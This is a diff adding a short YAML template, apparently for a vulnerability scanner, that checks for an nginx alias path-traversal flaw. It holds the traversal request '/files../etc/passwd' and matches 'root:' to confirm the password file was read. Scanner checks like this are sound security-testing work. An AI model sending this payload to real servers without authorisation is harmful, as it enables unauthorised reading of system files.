@@ -1,0 +1,7 @@
+name: nginx-alias
+request:
+  path: "/files../etc/passwd"
+  method: GET
+matcher:
+  type: word
+  words: ["root:"]
